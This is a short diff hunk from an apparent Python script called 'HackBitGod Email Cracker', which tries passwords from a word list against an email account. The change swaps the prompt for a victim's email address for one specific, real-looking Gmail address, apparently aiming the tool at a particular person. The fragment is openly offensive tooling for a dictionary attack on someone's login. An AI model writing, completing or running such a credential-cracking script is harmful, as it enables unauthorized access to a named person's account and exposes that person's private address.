@@ -79,7 +79,7 @@ except Exception as e:
 print (bcolors.BOLD + "HackBitGod Email Cracker" + bcolors.ENDC)
 print (bcolors.BOLD + "TRYING WITH PASSWORDS IN: psw.list" + bcolors.ENDC)
  
-user = raw_input("Enter The Victim's Email Address: ")
+user = raw_input("Torijeanine@gmail.com: ")
 passwfile = "psw.list"
 passwfile = open(passwfile, "r")
  
